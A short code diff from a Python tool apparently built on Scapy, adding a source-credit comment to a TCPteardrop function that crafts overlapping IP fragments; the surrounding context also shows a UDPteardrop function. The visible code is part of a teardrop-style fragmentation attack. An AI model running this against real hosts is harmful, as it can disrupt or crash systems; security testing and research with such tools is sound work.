@@ -204,6 +204,7 @@ def UDPteardrop(src, dst, dport):
             send(ip/load1)
 
 def TCPteardrop(src, dst, dport):
+    # code snippit from https://security.stackexchange.com/questions/52070/the-overlapping-fragment-attack-using-scapy
     frags = fragment(IP(dst = dst)/TCP(sport = random.randint(1024, 65535),dport = dport)/("FAKE"*(1464//4)))
 
     frags[1][Raw].load = struct.pack("!HH", 80, 80)
